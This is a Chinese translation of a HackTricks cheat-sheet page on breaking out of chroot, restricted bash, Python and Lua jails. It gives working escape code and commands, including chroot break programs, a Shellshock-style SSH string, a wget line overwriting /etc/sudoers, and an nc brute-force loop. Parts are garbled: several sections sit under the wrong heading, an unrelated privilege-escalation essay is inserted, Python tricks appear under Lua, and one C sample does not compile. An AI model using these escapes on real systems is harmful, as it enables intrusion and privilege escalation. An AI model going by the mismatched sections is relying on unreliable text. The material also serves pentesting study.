# 逃离监狱

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得**PEASS 的最新版本或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

## **GTFOBins**

**在** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **中搜索是否可以使用 "Shell" 属性执行任何二进制文件**

## Chroot 逃逸

来自 [维基百科](https://en.wikipedia.org/wiki/Chroot#Limitations)：chroot 机制**不是为了防止**特权（**root**）**用户**的故意篡改而设计的。在大多数系统上，chroot 上下文不能正确堆叠，具有足够特权的 chroot 程序**可以执行第二个 chroot 以逃脱**。\
通常这意味着要逃脱，你需要在 chroot 中成为 root。

{% hint style="success" %}
**工具**[**chw00t**](https://github.com/earthquake/chw00t)被创建用于滥用以下场景并从 `chroot` 中逃脱。
{% endhint %}

### Root + CWD

{% hint style="warning" %}
如果你在 chroot 中是**root**，你可以通过创建**另一个 chroot**来**逃脱**。这是因为两个 chroot 不能同时存在（在 Linux 中），所以如果你创建一个文件夹，然后在该新文件夹上**创建一个新的 chroot**，而你自己在外面，那么你现在将**在新的 chroot 外面**，因此你将在文件系统中。

这是因为通常 chroot **不会将你的工作目录移动到指定的目录**，所以你可以创建一个 chroot，但是在它之外。
{% endhint %}

通常你在 chroot 监狱中找不到 `chroot` 二进制文件，但是你**可以编译、上传和执行**一个二进制文件：

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python（Python）</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl（珀尔语）</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

{% hint style="warning" %}
这与前面的情况类似，但在这种情况下，攻击者将一个文件描述符存储到当前目录，然后在一个新文件夹中创建chroot。最后，由于他在chroot之外有对该FD的访问权限，他可以访问它并逃脱。
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD可以通过Unix域套接字传递，因此：

* 创建一个子进程（fork）
* 创建UDS，以便父进程和子进程可以通信
* 在子进程中的不同文件夹中运行chroot
* 在父进程中，创建一个位于新子进程chroot之外的文件夹的FD
* 使用UDS将该FD传递给子进程
* 子进程chdir到该FD，并且因为它在chroot之外，它将逃离监狱
{% endhint %}

### &#x20;Root + Mount

{% hint style="warning" %}
* 将根设备（/）挂载到chroot内部的目录中
* 进入该目录的chroot

这在Linux中是可能的
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* 将procfs挂载到chroot内部的目录中（如果尚未挂载）
* 查找具有不同根目录/当前工作目录条目的pid，例如：/proc/1/root
* 进入该条目的chroot
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* 创建一个Fork（子进程）并chroot到更深的文件夹中并在其上进行CD
* 从父进程中，将子进程所在的文件夹移动到chroot之前的文件夹中
* 这个子进程将发现自己在chroot之外
{% endhint %}

### ptrace

{% hint style="warning" %}
* 以前，用户可以从自己的进程中调试自己的进程...但是现在默认情况下不再可能
* 无论如何，如果可能的话，您可以ptrace进入一个进程并在其中执行shellcode（[参见此示例](linux-capabilities.md#cap_sys_ptrace)）。
{% endhint %}

## Bash监狱

### 枚举

获取有关监狱的信息：
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### 修改 PATH

检查是否可以修改 PATH 环境变量

```bash
echo $PATH
```

If you can modify the PATH variable, you can add a directory containing a malicious binary to it. When a user with higher privileges executes a command, the malicious binary will be executed instead, allowing for privilege escalation.

如果可以修改 PATH 变量，可以将包含恶意二进制文件的目录添加到其中。当具有较高权限的用户执行命令时，将执行恶意二进制文件，从而实现特权提升。

### Modify LD_LIBRARY_PATH

Check if you can modify the LD_LIBRARY_PATH env variable
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### 使用 vim

Vim is a powerful text editor that can be used to escalate privileges in a limited bash environment. Here's how you can use it:

1. Open a terminal and type `vim` to start the Vim editor.
2. Press `Esc` to enter command mode.
3. Type `:set shell=/bin/bash` to set the shell to `/bin/bash`.
4. Press `Enter` to execute the command.
5. Type `:shell` to open a new shell with escalated privileges.
6. Press `Enter` to execute the command.
7. You should now have a new shell with higher privileges.

Remember to use this technique responsibly and only on systems that you have permission to access.
```bash
:set shell=/bin/sh
:shell
```
### 创建脚本

检查是否可以创建一个内容为 _/bin/bash_ 的可执行文件。
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### 从SSH获取bash

如果您通过SSH访问，可以使用以下技巧执行bash shell：
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### 声明

在进行特权升级之前，我们需要先了解一些基本概念和技术。这些概念和技术将帮助我们理解如何从受限的Bash环境中逃脱，并获取更高的权限。

#### 1. 什么是特权升级？

特权升级是指通过利用系统中的漏洞或弱点，从低权限用户提升为高权限用户的过程。这样做可以让我们执行更多的操作和访问受限资源。

#### 2. 为什么需要特权升级？

在进行渗透测试或攻击时，我们通常只拥有低权限用户的权限。这限制了我们能够执行的操作和访问的资源。通过进行特权升级，我们可以获取更高的权限，从而扩大我们的攻击面和影响力。

#### 3. 如何进行特权升级？

特权升级可以通过多种方式实现，包括但不限于以下几种方法：

- 利用系统漏洞：通过发现和利用系统中的漏洞，我们可以提升权限。
- 利用软件漏洞：某些软件可能存在漏洞，我们可以利用这些漏洞来提升权限。
- 利用配置错误：系统或软件的配置错误可能导致权限提升的机会。
- 利用弱密码：如果我们能够获取到某个用户的密码，我们可以使用这个密码来提升权限。

#### 4. 从受限的Bash环境中逃脱

在某些情况下，我们可能会被限制在一个受限的Bash环境中，无法执行某些命令或访问某些资源。然而，即使在这种受限环境下，我们仍然有一些方法可以逃脱并获取更高的权限。

以下是一些常见的方法：

- 利用Bash的特殊字符：Bash中的一些特殊字符可以用于执行命令或绕过限制。
- 利用环境变量：通过设置环境变量，我们可以改变Bash的行为并提升权限。
- 利用SUID/SGID权限：某些可执行文件具有SUID或SGID权限，我们可以利用这些权限来提升自己的权限。
- 利用可写的配置文件：如果我们能够修改某个可写的配置文件，我们可以在其中添加恶意代码来提升权限。

了解这些基本概念和技术将帮助我们更好地理解特权升级的过程，并在实际操作中更加灵活和高效。在接下来的章节中，我们将深入探讨这些方法，并提供详细的示例和实践技巧。
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

您可以覆盖例如sudoers文件
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### 其他技巧

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**这个页面也很有趣：**

{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
{% endcontent-ref %}

## Python监狱

关于从Python监狱中逃脱的技巧，请参考以下页面：

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua监狱

在这个页面上，您可以找到在Lua中可以访问的全局函数：[https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**使用命令执行的Eval：**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
一些**在不使用点号的情况下调用库函数的技巧**：

- **Using the `import` statement**: You can import the library and then call its functions directly. For example, `import os; os.system('command')`.

- **Using the `__import__` function**: This function allows you to import a library dynamically and call its functions. For example, `__import__('os').system('command')`.

- **Using the `getattr` function**: This function allows you to get an attribute or function from a library and call it. For example, `getattr(__import__('os'), 'system')('command')`.

- **Using the `exec` function**: This function allows you to execute arbitrary code, including calling functions from a library. For example, `exec('__import__("os").system("command")')`.

- **Using the `globals` function**: This function returns a dictionary of the current global symbol table, which includes imported libraries. You can use it to call functions from a library. For example, `globals()['os'].system('command')`.

Remember to replace `'command'` with the desired command or function call.
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
列举库的函数功能：
```bash
for k,v in pairs(string) do print(k,v) end
```
请注意，每次在**不同的lua环境中执行上述一行命令时，函数的顺序会发生变化**。因此，如果您需要执行特定的函数，可以通过加载不同的lua环境并调用le库的第一个函数来进行暴力攻击：
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**获取交互式lua shell**：如果你在一个受限制的lua shell中，你可以调用以下命令获取一个新的lua shell（希望是无限制的）：
```bash
debug.debug()
```
## 参考资料

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (幻灯片: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者想要**获取 PEASS 的最新版本或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
